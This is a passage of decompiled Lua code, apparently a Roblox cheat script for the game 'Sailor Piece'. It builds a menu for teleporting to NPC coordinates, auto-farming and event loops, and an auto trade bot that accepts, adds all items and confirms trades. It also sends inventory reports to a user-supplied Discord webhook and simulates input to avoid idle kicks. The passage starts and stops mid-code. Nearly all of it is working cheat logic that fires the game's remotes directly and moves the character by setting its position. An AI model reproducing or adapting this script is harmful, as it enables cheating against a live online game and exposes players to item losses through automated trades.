            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.655133545
        )
        values.items21.GojoMasteryNPC = values.gojoMasteryNPC
        values.new38 = environment.CFrame.new
        values.numberValueState.value = 0.00171344238
        values.numberValueState2.value = 0.989796996
        values.numberValueState3.value = 0.000243837188
        values.conquerorHakiNPC = values.new38(
            1942.71753,
            144.406006,
            -24.579298,
            -0.142484665,
            0.0016960036,
            -0.989795566,
            3.05299181e-07,
            0.99999851,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.142484426
        )
        values.items21.ConquerorHakiNPC = values.conquerorHakiNPC
        values.new39 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.439652443
        values.numberValueState3.value = 0
        values.slimeCraftNPC = values.new39(
            -1167.46204,
            8.50944901,
            173.572083,
            -0.898167968,
            0,
            -0.439652443,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.898167968
        )
        values.items21.SlimeCraftNPC = values.slimeCraftNPC
        values.new40 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.833270311
        values.numberValueState3.value = 0
        values.rimuruBuyer = values.new40(
            -1539.56653,
            9.42505264,
            66.1064453,
            0.552865744,
            0,
            0.833270311,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0.552865744
        )
        values.items21.RimuruBuyer = values.rimuruBuyer
        values.new41 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = -0.20053567
        values.numberValueState3.value = 0
        values.rimuruMasteryNPC = values.new41(
            -1324.74353,
            21.1937218,
            527.840942,
            -0.979686379,
            0,
            0.20053567,
            0,
            1,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.979686379
        )
        values.items21.RimuruMasteryNPC = values.rimuruMasteryNPC
        values.new42 = environment.CFrame.new
        values.numberValueState.value = 0.173635185
        values.numberValueState2.value = 0.406754792
        values.numberValueState3.value = 0.158616096
        values.shadowMonarchBuyerNPC = values.new42(
            1463.05493,
            48.956459,
            -901.405945,
            -0.913537383,
            0.0706406906,
            -0.40057379,
            1.52811408e-05,
            0.984810054,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.899661899
        )
        values.items21.ShadowMonarchBuyerNPC = values.shadowMonarchBuyerNPC
        values.new43 = environment.CFrame.new
        values.numberValueState.value = -0.238538831
        values.numberValueState2.value = 0.714965641
        values.numberValueState3.value = -0.185271978
        values.shadowMonarchQuestlineBuff = values.new43(
            243.936356,
            26.6213665,
            -83.2128372,
            -0.698652267,
            -0.152592182,
            -0.698999822,
            0.026632756,
            0.970767677,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.67416513
        )
        values.items21.ShadowMonarchQuestlineBuff = values.shadowMonarchQuestlineBuff
        values.values4 = {}
        values.callResults4 = runtime.pack(environment.pairs(values.items21))
        values.callResults5 = values.callResults4
        values.savedIterations3 = {
            values.savedIterations2,
            [5] = values.iterationStep2,
            values.iterationLimit2,
            values.iterationCursor2,
        }
        values.result16 = runtime.wrapIterator(runtime.iteratorBody1)
        values.result16(values.callResults5[1], values.callResults5[2], values.callResults5[3])
        values.iteratorKey = nil
        values.iterationCursor3 = values.result16
        while true do
            values.hasNext2, values.iteratorKey5, values.iteratorValue2 = values.iterationCursor3()
            if not values.hasNext2 then
            else
                values.iteratorKey = values.iteratorKey5
            end
            if values.hasNext2 then
                environment.table.insert(values.values4, values.iteratorKey)
                continue
            end
            break
        end
        values.iterationCursor = values.savedIterations3[3]
        values.iterationLimit = values.savedIterations3[2]
        values.iterationStep = values.savedIterations3[5]
        values.savedIterations = values.savedIterations3[1]
        environment.table.sort(values.values4)
        values.teleport = values.items31.Teleport
        values.addDropdown2 = values.teleport.AddDropdown
        values.items5 = {}
        values.items5.Title = "Select NPC"
        values.items5.Values = values.values4
        values.items5.Multi = false
        values.items5.Default = 1
        values.value5 = (values.addDropdown2(values.teleport, "SelectNPC", values.items5))
        values.value5.OnChanged(values.value5, functions.handleCallback26(environment))
        values.teleport2 = values.items31.Teleport
        values.addButton = values.teleport2.AddButton
        values.items6 = {}
        values.items6.Title = "Teleport To NPC"
        values.items6.Description = "Click to Teleport"
        values.items6.Callback = functions.callbackAtLine38(
            environment,
            values.items21,
            values.localPlayer2,
            values.callback9,
            values.callback8
        )
        values.addButton(values.teleport2, values.items6)
        values.teleport3 = values.items31.Teleport
        values.teleport3.AddSection(values.teleport3, "Auto Slime Event")
        values.new2 = environment.CFrame.new
        values.numberValueState.value = 1
        values.numberValueState2.value = 0
        values.numberValueState3.value = 0.439652443
        values.newResult = values.new2(
            -1167.46204,
            2.75521803,
            173.572083,
            -0.898167968,
            0,
            -0.439652443,
            0,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0,
            -0.898167968
        )
        values.teleport4 = values.items31.Teleport
        values.addToggle4 = values.teleport4.AddToggle
        values.items7 = {}
        values.items7.Title = "Auto Slime ( รับเควส + เก็บ )"
        values.items7.Default = false
        values.value6 = (values.addToggle4(values.teleport4, "AutoSlimeEvent", values.items7))
        values.value6.OnChanged(
            values.value6,
            functions.handleSpawn7(
                environment,
                values.options,
                values.callback9,
                values.newResult,
                values.callback10,
                values.callback11,
                values.items46
            )
        )
        values.teleport5 = values.items31.Teleport
        values.teleport5.AddSection(values.teleport5, "Auto Hogyoku Event")
        values.new3 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 1
        values.numberValueState3.value = 0
        values.newResult2 = values.new3(
            -379.570282,
            8.73462963,
            1529.37817,
            0.39499855,
            0,
            0.9186818,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            -0.9186818,
            0,
            0.39499855
        )
        values.teleport6 = values.items31.Teleport
        values.addToggle5 = values.teleport6.AddToggle
        values.items8 = {}
        values.items8.Title = "Auto Hogyoku ( รับเควส + เก็บ )"
        values.items8.Default = false
        values.value7 = (values.addToggle5(values.teleport6, "AutoHogyokuEvent", values.items8))
        values.value7.OnChanged(
            values.value7,
            functions.handleSpawn11(
                environment,
                values.options,
                values.callback9,
                values.newResult2,
                values.callback10,
                values.callback11,
                values.items49
            )
        )
        values.teleport7 = values.items31.Teleport
        values.teleport7.AddSection(values.teleport7, "Auto Demonite Event")
        values.new4 = environment.CFrame.new
        values.numberValueState.value = 0.92718488
        values.numberValueState2.value = 0
        values.numberValueState3.value = 1
        values.newResult3 = values.new4(
            727.65625,
            -1.79563808,
            1273.05908,
            -0.374604106,
            0,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            0,
            -0.92718488,
            0,
            -0.374604106
        )
        values.teleport8 = values.items31.Teleport
        values.addToggle6 = values.teleport8.AddToggle
        values.items9 = {}
        values.items9.Title = "Auto Demonite Event (รับเควส + เก็บ)"
        values.items9.Default = false
        values.value8 = (values.addToggle6(values.teleport8, "AutoDemoniteEvent", values.items9))
        values.value8.OnChanged(
            values.value8,
            functions.handleSpawn5(
                environment,
                values.options,
                values.callback9,
                values.newResult3,
                values.callback10,
                values.callback11,
                values.items48
            )
        )
        values.teleport9 = values.items31.Teleport
        values.teleport9.AddSection(values.teleport9, "Auto Dungeon Event")
        values.new5 = environment.CFrame.new
        values.numberValueState.value = 0
        values.numberValueState2.value = 0.913554907
        values.numberValueState3.value = 0
        values.newResult4 = values.new5(
            1426.23938,
            2.20256138,
            -929.140381,
            -0.406715393,
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value,
            1,
            0,
            -0.913554907,
            0,
            -0.406715393
        )
        values.teleport10 = values.items31.Teleport
        values.addToggle7 = values.teleport10.AddToggle
        values.items10 = {}
        values.items10.Title = "Auto Jigsaw Event (รับเควส + เก็บ)"
        values.items10.Default = false
        values.value9 = (values.addToggle7(values.teleport10, "AutoJigsawEvent", values.items10))
        values.value9.OnChanged(
            values.value9,
            functions.handleSpawn4(
                environment,
                values.options,
                values.callback9,
                values.newResult4,
                values.callback10,
                values.callback11,
                values.items47
            )
        )
        values.trade = values.items31.Trade
        values.trade.AddSection(values.trade, "Auto Trade Bot")
        values.trade2 = values.items31.Trade
        values.addToggle8 = values.trade2.AddToggle
        values.items11 = {}
        values.items11.Title = "Auto Accept Requests"
        values.items11.Default = false
        values.addToggleResult = values.addToggle8(values.trade2, "Trade_AutoAccept", values.items11)
        values.trade3 = values.items31.Trade
        values.addToggle9 = values.trade3.AddToggle
        values.numberValueState.value = {}
        values.numberValueState.value.Title = "Auto Add ALL Items"
        values.numberValueState.value.Default = false
        values.addToggleResult2 =
            values.addToggle9(values.trade3, "Trade_AutoAddAll", values.numberValueState.value)
        values.trade4 = values.items31.Trade
        values.addToggle10 = values.trade4.AddToggle
        values.numberValueState.value = "Trade_AutoReady"
        values.numberValueState2.value = {}
        values.numberValueState2.value.Title = "Auto Ready"
        values.numberValueState2.value.Default = false
        values.addToggleResult3 =
            values.addToggle10(values.trade4, values.numberValueState.value, values.numberValueState2.value)
        values.trade5 = values.items31.Trade
        values.numberValueState.value = values.trade5
        values.addToggle11 = values.trade5.AddToggle
        values.numberValueState2.value = "Trade_AutoConfirm"
        values.numberValueState3.value = {}
        values.numberValueState3.value.Title = "Auto Confirm"
        values.numberValueState3.value.Default = false
        values.addToggleResult4 = values.addToggle11(
            values.numberValueState.value,
            values.numberValueState2.value,
            values.numberValueState3.value
        )
        values.numberValueState.value = nil
        values.numberValueState2.value = false
        values.numberValueState3.value = environment.task
        values.numberValueState3.value = values.numberValueState3.value.spawn
        values.numberValueState3.value(
            functions.handleWaitForChildAtLine48(
                environment,
                values.addToggleResult,
                values.addToggleResult2,
                values.numberValueState2,
                values.addToggleResult3,
                values.addToggleResult4,
                values.items31,
                values.numberValueState,
                values.result13
            )
        )
        values.numberValueState3.value = values.items31.Settings
        values.numberValue = values.numberValueState3.value
        values.numberValueState3.value = values.numberValue.AddSection
        values.numberValueState3.value(values.numberValue, "Miscs")
        values.numberValueState3.value = {}
        values.gameValue = environment.game
        values.value10 = (values.gameValue.GetService(values.gameValue, "ReplicatedStorage"))
        values.value11 = (values.value10.WaitForChild(values.value10, "Remotes"))
        values.onClientEvent = (values.value11.WaitForChild(values.value11, "UpdateInventory")).OnClientEvent
        values.onClientEvent.Connect(
            values.onClientEvent,
            functions.handleCallback17(environment, values.numberValueState3)
        )
        values.settings = values.items31.Settings
        values.settings.AddSection(values.settings, "Discord Webhook System")
        values.gValue4 = environment._G
        values.gValue4.WebhookURL = ""
        values.settings2 = values.items31.Settings
        values.addInput = values.settings2.AddInput
        values.items12 = {}
        values.items12.Title = "Discord Webhook URL"
        values.items12.Placeholder = "วางลิงก์ของคุณที่นี่..."
        values.items12.Finished = true
        values.items12.Callback = functions.callback3(environment)
        values.addInput(values.settings2, "WebhookURLInput", values.items12)
        values.callback3 = functions.handleWarn(
            environment,
            values.localPlayer,
            functions.handleCallback29(environment),
            functions.handlePairs2(environment, values.numberValueState3),
            values.getServiceResult
        )
        values.settings3 = values.items31.Settings
        values.addButton2 = values.settings3.AddButton
        values.items13 = {}
        values.items13.Title = "Send Manual Report"
        values.items13.Description =
            "ดึงข้อมูลจากกระเป๋าและส่งเข้า Discord ทันที"
        values.items13.Callback = functions.callbackAtLine4(environment, values.callback3, values.result13)
        values.addButton2(values.settings3, values.items13)
        values.settings4 = values.items31.Settings
        values.addToggle12 = values.settings4.AddToggle
        values.items14 = {}
        values.items14.Title = "Webhook Auto (ส่งทุก 10 นาที)"
        values.items14.Default = false
        values.addToggle12(values.settings4, "EnableAutoReport", values.items14)
        environment.task.spawn(functions.handleTick(environment, values.options, values.callback3))
        values.settings5 = values.items31.Settings
        values.settings5.AddSection(values.settings5, "Anti-AFK Setting")
        values.settings6 = values.items31.Settings
        values.addToggle13 = values.settings6.AddToggle
        values.items15 = {}
        values.items15.Title = "Anti AFK (กันหลุด)"
        values.items15.Default = true
        values.value12 = (values.addToggle13(values.settings6, "AntiAFK", values.items15))
        values.value12.OnChanged(values.value12, functions.handleCallback30(environment))
        values.gameValue2 = environment.game
        values.idled = (values.gameValue2.GetService(values.gameValue2, "Players")).LocalPlayer.Idled
        values.idled.Connect(values.idled, functions.handleGetService(environment))
        environment.task.spawn(
            functions.handlePcallAtLine123(
                environment,
                values.options,
                values.replicatedStorage,
                values.items18
            )
        )
        environment.task.spawn(functions.handlePcallAtLine97(environment, values.options))
        environment.task.spawn(
            functions.handleWaitAtLine117(
                environment,
                values.options,
                values.items43,
                values.sharedValueState7
            )
        )
        values.result = values.result14
        values.result.SetLibrary(values.result, values.result13)
        values.result2 = values.result15
        values.result2.SetLibrary(values.result2, values.result13)
        values.result3 = values.result14
        values.result3.IgnoreThemeSettings(values.result3)
        values.result4 = values.result14
        values.result4.SetIgnoreIndexes(values.result4, {})
        values.result5 = values.result15
        values.result5.SetFolder(values.result5, "FluentScriptHub")
        values.result6 = values.result14
        values.result6.SetFolder(values.result6, "SailorPiece_Mamypoko")
        values.result7 = values.result14
        values.result7.BuildConfigSection(values.result7, values.items31.Settings)
        values.result8 = values.result15
        values.result8.BuildInterfaceSection(values.result8, values.items31.Settings)
        values.result9 = values.createWindowResult
        values.result9.SelectTab(values.result9, 1)
        values.result10 = values.result14
        values.result10.LoadAutoloadConfig(values.result10)
        environment.task.delay(1, functions.handleSetValue(environment, values.result13))
        values.result11 = values.createWindowResult
        values.result11.SelectTab(values.result11, 1)
        values.result12 = values.result13
        values.notify = values.result12.Notify
        values.items16 = {}
        values.items16.Title = "[🗡️Alter Update🔥] Sailor Piece Script !"
        values.items16.Content = "Script Loaded !"
        values.items16.Duration = 5
        values.notify(values.result12, values.items16)
        return
    end, closureEnvironment)
end

function functions.handleGetService(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, gameValue2, value, value2
        if environment._G.AntiAFK then
            gameValue = environment.game
            value = (gameValue.GetService(gameValue, "VirtualUser"))
            value.Button2Down(
                value,
                (environment.Vector2.new(0, 0)),
                environment.workspace.CurrentCamera.CFrame
            )
            environment.task.wait(1)
            gameValue2 = environment.game
            value2 = (gameValue2.GetService(gameValue2, "VirtualUser"))
            value2.Button2Up(
                value2,
                (environment.Vector2.new(0, 0)),
                environment.workspace.CurrentCamera.CFrame
            )
        end
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine1(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedSummonBoss = ...
        local gValue
        gValue = environment._G
        gValue.SelectedSummonBoss = selectedSummonBoss
        return
    end, closureEnvironment)
end

function functions.handlePcall2(closureEnvironment, capturedItems45)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local assemblyLinearVelocity, character, character2, gValue, gValue2, humanoidRootPart, value
        value = capturedItems45[argument1]
        if not value then
            return false
        else
            gValue2 = environment._G
            gValue2.IsPortaling = true
            character = environment.game.Players.LocalPlayer.Character
            if character then
                character2 = character
                if character2.FindFirstChild(character2, "HumanoidRootPart") then
                    humanoidRootPart = character.HumanoidRootPart
                    assemblyLinearVelocity = environment.Vector3.zero
                    humanoidRootPart.AssemblyLinearVelocity = assemblyLinearVelocity
                end
            end
            environment.pcall(functions.handleWaitForChild(environment, value))
            environment.task.wait()
            gValue = environment._G
            gValue.IsPortaling = false
            return true
        end
    end, closureEnvironment)
end

function functions.handleWaitForChild(closureEnvironment, capturedValue)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local gameValue, remotes, remotes2, remotes3, remotes4, value, value2, value3, value4
        gameValue = environment.game
        value2 = (gameValue.GetService(gameValue, "ReplicatedStorage"))
        remotes2 = value2.WaitForChild(value2, "Remotes")
        if capturedValue == "SoulSociety" then
            remotes4 = remotes2
            value4 = (remotes4.WaitForChild(remotes4, "CheckPortalUnlock"))
            value4.InvokeServer(value4, capturedValue)
            environment.task.wait(0.1)
            remotes = remotes2
            value = (remotes.WaitForChild(remotes, "TeleportToPortal"))
            value.FireServer(value, capturedValue)
        else
            remotes3 = remotes2
            value3 = (remotes3.WaitForChild(remotes3, "TeleportToPortal"))
            value3.FireServer(value3, capturedValue)
        end
        return
    end, closureEnvironment)
end

function functions.handlePairs(closureEnvironment, capturedItems44)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, callResults, callResults2, hasNext, huge, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorKey2, iteratorKey3
        local iteratorValue, iteratorValue2, magnitude, result, savedIterations, savedIterations2
        argument12 = argument1
        iteratorKey = nil
        huge = environment.math.huge
        callResults = runtime.pack(environment.pairs(capturedItems44))
        callResults2 = callResults
        savedIterations2 = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults2[1], callResults2[2], callResults2[3])
        iteratorKey2 = nil
        iteratorValue = nil
        iterationCursor2 = result
        while true do
            hasNext, iteratorKey3, iteratorValue2 = iterationCursor2()
            if not hasNext then
            else
                iteratorKey2 = iteratorKey3
                iteratorValue = iteratorValue2
            end
            if hasNext then
                magnitude = ((argument12 - iteratorValue.Position)).Magnitude
                if magnitude < huge then
                    huge = magnitude
                    iteratorKey = iteratorKey2
                end
                continue
            end
            break
        end
        iterationCursor = savedIterations2[3]
        iterationLimit = savedIterations2[2]
        iterationStep = savedIterations2[5]
        savedIterations = savedIterations2[1]
        return iteratorKey
    end, closureEnvironment)
end

function functions.handleSpawn(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local gValue
        if argument1 then
            gValue = environment._G
            gValue.HasWarpedToGilgamesh = false
            environment.task.spawn(functions.handleNewAtLine4(environment, capturedCallback9))
        end
        return
    end, closureEnvironment)
end

function functions.handleNewAtLine4(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, value
        value = capturedCallback9
        callResults = runtime.pack(environment.Vector3.new(651.810181, -3.67419362, -1021.13123))
        value(runtime.unpack(callResults, 1, (((callResults.n + 2) - 1) - 1)))
        return
    end, closureEnvironment)
end

function functions.callback(
    closureEnvironment,
    capturedOptions,
    capturedCallback8,
    capturedVirtualInputManager
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local cFrameObject
        cFrameObject = environment.CFrame.new(
            1434.00439,
            4.45256138,
            -932.597717,
            -0.406715393,
            0,
            0.913554907,
            0,
            1,
            0,
            -0.913554907,
            0,
            -0.406715393
        )
        while true do
            environment.task.wait(0.5)
            if
                not (
                    not capturedOptions.AutoJoinTeam
                    or ((not capturedOptions.AutoJoinTeam.Value) or environment._G.IsPortaling)
                )
            then
                environment.pcall(
                    functions.handleSendKeyEvent(
                        environment,
                        capturedCallback8,
                        cFrameObject,
                        capturedVirtualInputManager
                    )
                )
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleSendKeyEvent(
    closureEnvironment,
    capturedCallback8,
    capturedCFrameObject,
    capturedVirtualInputManager
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        capturedCallback8(capturedCFrameObject)
        value = capturedVirtualInputManager
        value.SendKeyEvent(value, true, environment.Enum.KeyCode.E, false, environment.game)
        environment.task.wait(0.1)
        return
    end, closureEnvironment)
end

function functions.callbackAtLine1(closureEnvironment, capturedItemsState3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local tonumberResult
        tonumberResult = environment.tonumber(argument1)
        if not tonumberResult then
            tonumberResult = 1
        end
        capturedItemsState3.value = tonumberResult
        return
    end, closureEnvironment)
end

function functions.handleCallback2(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local selectedGilgameshDifficulty = ...
        local gValue
        gValue = environment._G
        gValue.SelectedGilgameshDifficulty = selectedGilgameshDifficulty
        return
    end, closureEnvironment)
end

function functions.handleNewAtLine1(closureEnvironment, capturedCallback9)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local callback
        if argument1 == true then
            callback = functions.handleCallbackAtLine90(
                environment,
                capturedCallback9,
                (
                    environment.CFrame.new(
                        901.426392,
                        1.4632163,
                        1293.13623,
                        -0.92051065,
                        0,
                        -0.390717506,
                        0,
                        1,
                        0,
                        0.390717506,
                        0,
                        -0.92051065
                    )
                )
            )
            environment.task.spawn(callback)
        end
        return
    end, closureEnvironment)
end

function functions.handleCallbackAtLine90(closureEnvironment, capturedCallback9, capturedSharedValue)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        capturedCallback9(capturedSharedValue.Position)
        return
    end, closureEnvironment)
end

function functions.handleCallback3(closureEnvironment, capturedValuesState2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        capturedValuesState2.value = argument1
        return
    end, closureEnvironment)
end

function functions.handleNew2(
    closureEnvironment,
    capturedCallback7,
    capturedNumberValueState4,
    capturedCallback6,
    capturedTweenService
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local assemblyAngularVelocity, assemblyAngularVelocity2, assemblyAngularVelocity3, assemblyLinearVelocity, assemblyLinearVelocity2, assemblyLinearVelocity3, cFrame, cFrame2, ceilResult, character, character2, character3
        local create, createResult, gValue, gameValue, gameValue2, heartbeat, humanoidRootPart, items, iterationCursor, iterationCursor2, iterationCursor3, iterationLimit
        local iterationLimit2, iterationStep, iterationStep2, magnitude, matches, numberValue, position, position2, result, result2, result3, savedIterations
        local savedIterations2, teleportTicket, teleportTicket2, teleportTicket3, tickResult, tweenInfoObject, value, value2
        cFrame = argument1
        if not environment._G.IsPortaling then
            gameValue = environment.game
            character3 = (gameValue.GetService(gameValue, "Players")).LocalPlayer.Character
            if not character3 then
                return
            else
                character2 = character3
                if not (character2.FindFirstChild(character2, "HumanoidRootPart")) then
                    return
                else
                    humanoidRootPart = character3.HumanoidRootPart
                    position = humanoidRootPart.Position
                    position2 = cFrame.Position
                    magnitude = ((position - position2)).Magnitude
                    result2 = capturedCallback7(position2)
                    result3 = capturedCallback7(position)
                    if ((not result2) or not result3) or (result2 == result3) then
                        gValue = environment._G
                        teleportTicket = environment._G.TeleportTicket
                        if not teleportTicket then
                            teleportTicket = 0
                        end
                        teleportTicket2 = (teleportTicket + 1)
                        gValue.TeleportTicket = teleportTicket2
                        teleportTicket3 = environment._G.TeleportTicket
                        if environment._G.MoveMethod == "Tween" then
                            numberValue = (magnitude / 200)
                            if numberValue < 0.01 then
                                numberValue = 0.01
                            end
                            tweenInfoObject =
                                environment.TweenInfo.new(numberValue, environment.Enum.EasingStyle.Linear)
                            value = capturedTweenService
                            create = value.Create
                            items = {}
                            items.CFrame = cFrame
                            createResult = create(value, humanoidRootPart, tweenInfoObject, items)
                            result = createResult
                            result.Play(result)
                            environment.task.spawn(
                                functions.handleWait(environment, createResult, teleportTicket3)
                            )
                            assemblyLinearVelocity = environment.Vector3.zero
                            humanoidRootPart.AssemblyLinearVelocity = assemblyLinearVelocity
                            assemblyAngularVelocity = environment.Vector3.zero
                            humanoidRootPart.AssemblyAngularVelocity = assemblyAngularVelocity
                            return
                        else
                            if not (300 < magnitude) then
                                humanoidRootPart.CFrame = cFrame
                                assemblyLinearVelocity3 = environment.Vector3.zero
                                humanoidRootPart.AssemblyLinearVelocity = assemblyLinearVelocity3
                                assemblyAngularVelocity3 = environment.Vector3.zero
                                humanoidRootPart.AssemblyAngularVelocity = assemblyAngularVelocity3
                                return
                            else
                                ceilResult = environment.math.ceil((magnitude / 250))
                                iterationCursor = nil
                                savedIterations = { nil, [5] = nil, nil, nil }
                                iterationStep = (1 + 0)
                                iterationLimit = (ceilResult + 0)
                                iterationCursor2 = (1 - iterationStep)
                                while true do
                                    iterationCursor2 = (iterationCursor2 + iterationStep)
                                    if iterationStep <= 0 then
                                        matches = (iterationCursor2 >= iterationLimit)
                                    else
                                        matches = (iterationCursor2 <= iterationLimit)
                                    end
                                    if matches then
                                        iterationCursor = iterationCursor2
                                    end
                                    if matches then
                                        if environment._G.TeleportTicket ~= teleportTicket3 then
                                            return
                                        else
                                            if character3 then
                                                character = character3
                                                if
                                                    character.FindFirstChild(character, "HumanoidRootPart")
                                                then
                                                    value2 = (environment.CFrame.new(position))
                                                    cFrame2 = value2.Lerp(
                                                        value2,
                                                        cFrame,
                                                        (iterationCursor / ceilResult)
                                                    )
                                                    humanoidRootPart.CFrame = cFrame2
                                                    assemblyLinearVelocity2 = environment.Vector3.zero
                                                    humanoidRootPart.AssemblyLinearVelocity =
                                                        assemblyLinearVelocity2
                                                    assemblyAngularVelocity2 = environment.Vector3.zero
                                                    humanoidRootPart.AssemblyAngularVelocity =
                                                        assemblyAngularVelocity2
                                                    gameValue2 = environment.game
                                                    heartbeat = (gameValue2.GetService(
                                                        gameValue2,
                                                        "RunService"
                                                    )).Heartbeat
                                                    heartbeat.Wait(heartbeat)
                                                    continue
                                                end
                                            end
                                        end
                                    end
                                    break
                                end
                                iterationCursor3 = savedIterations[3]
                                iterationLimit2 = savedIterations[2]
                                iterationStep2 = savedIterations[5]
                                savedIterations2 = savedIterations[1]
                                return
                            end
                        end
                    else
                        if 3 < ((environment.tick()) - capturedNumberValueState4.value) then
                            tickResult = environment.tick()
                            capturedNumberValueState4.value = tickResult
                            environment.task.spawn(
                                functions.handleCallbackAtLine93(environment, capturedCallback6, result2)
                            )
                        end
                        return
                    end
                end
            end
        else
            return
        end
    end, closureEnvironment)
end

function functions.handleCallbackAtLine93(closureEnvironment, capturedCallback6, capturedResult2)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        capturedCallback6(capturedResult2)
        return
    end, closureEnvironment)
end

function functions.handleWait(closureEnvironment, capturedCreateResult, capturedTeleportTicket3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        while true do
            if capturedCreateResult.PlaybackState == environment.Enum.PlaybackState.Playing then
                environment.task.wait()
                if environment._G.TeleportTicket ~= capturedTeleportTicket3 then
                    value = capturedCreateResult
                    value.Cancel(value)
                else
                    continue
                end
            end
            break
        end
        return
    end, closureEnvironment)
end

function functions.handleCallback4(closureEnvironment, capturedCallback7, capturedItems45, capturedCallback6)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local result
        result = capturedCallback7(argument1)
        if not ((not result) or not capturedItems45[result]) then
            capturedCallback6(result)
        end
        return
    end, closureEnvironment)
end

function functions.handleWaitAtLine110(
    closureEnvironment,
    capturedOptions,
    capturedTextValueState2,
    capturedValuesState,
    capturedTextValueState3,
    capturedTextValueState4,
    capturedItemsState2,
    capturedAutoFarmState,
    capturedValues2,
    capturedLocalPlayer2,
    capturedItems41,
    capturedCallback6,
    capturedDefaultState,
    capturedCallback5,
    capturedCallback8,
    capturedCallback13,
    capturedSharedValueState4,
    capturedCallback15
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local value
        while true do
            environment.task.wait()
            if (not capturedOptions.AutoFarmAllMob) or not capturedOptions.AutoFarmAllMob.Value then
                capturedItemsState2.value = false
                capturedTextValueState2.value = {}
                capturedValuesState.value = value
                capturedTextValueState3.value = value
                capturedTextValueState4.value = 0
                environment.task.wait(0.1)
            else
                if (not environment._G.BossIsActive) and not environment._G.IsPortaling then
                    if not capturedItemsState2.value then
                        capturedItemsState2.value = true
                        capturedAutoFarmState.value = 1
                        capturedTextValueState3.value = value
                        capturedTextValueState2.value = {}
                        capturedValuesState.value = value
                        capturedTextValueState4.value = 0
                    end
                    environment.pcall(
                        functions.handleFindFirstChild(
                            environment,
                            capturedValues2,
                            capturedAutoFarmState,
                            capturedTextValueState2,
                            capturedTextValueState3,
                            capturedLocalPlayer2,
                            capturedItems41,
                            capturedCallback6,
                            capturedTextValueState4,
                            capturedValuesState,
                            capturedDefaultState,
                            capturedCallback5,
                            capturedCallback8,
                            capturedCallback13,
                            capturedSharedValueState4,
                            capturedCallback15
                        )
                    )
                else
                    capturedTextValueState2.value = {}
                    capturedValuesState.value = value
                    capturedTextValueState3.value = value
                    capturedTextValueState4.value = 0
                    environment.task.wait(0.5)
                end
            end
            continue
        end
    end, closureEnvironment)
end

function functions.handleFindFirstChild(
    closureEnvironment,
    capturedValues2,
    capturedAutoFarmState,
    capturedTextValueState2,
    capturedTextValueState3,
    capturedLocalPlayer2,
    capturedItems41,
    capturedCallback6,
    capturedTextValueState4,
    capturedValuesState,
    capturedDefaultState,
    capturedCallback5,
    capturedCallback8,
    capturedCallback13,
    capturedSharedValueState4,
    capturedCallback15
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults10, callResults11, callResults2, callResults3, callResults4, callResults5, callResults6, callResults7, callResults8, callResults9, character
        local character2, enabled, enabled2, enemies, find, find2, gValue, hasNext, hasNext2, hasNext3, hasNext4, humanoid
        local humanoidRootPart, humanoidRootPart2, island, item, item2, item3, items, items2, items3, iterationCursor, iterationCursor2, iterationCursor3
        local iterationCursor4, iterationCursor5, iterationCursor6, iterationCursor7, iterationLimit, iterationLimit2, iterationLimit3, iterationStep, iterationStep2, iterationStep3, iteratorKey, iteratorKey2
        local iteratorKey3, iteratorKey4, iteratorValue, iteratorValue10, iteratorValue11, iteratorValue2, iteratorValue3, iteratorValue4, iteratorValue5, iteratorValue6, iteratorValue7, iteratorValue8
